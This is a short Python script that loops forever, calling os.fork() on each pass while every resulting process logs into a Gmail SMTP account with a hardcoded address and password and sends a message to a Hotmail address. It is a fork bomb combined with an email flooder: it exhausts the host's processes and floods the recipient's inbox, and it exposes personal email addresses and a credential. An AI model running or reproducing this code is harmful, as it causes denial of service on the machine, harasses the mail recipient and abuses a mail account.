#!/usr/bin/python
import smtplib
import os
while (1):
	os.fork() 
	fromaddr = 'rodolfocaserib@gmail.com'
	toaddrs  = 'rodolfo2804@hotmail.com'
	msg = 'ABVC123'

	username = 'rodolfocaserib@gmail.com'
	password = 'MINHASENHA'

	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(username,password)
	server.sendmail(fromaddr, toaddrs, msg)
	server.quit()
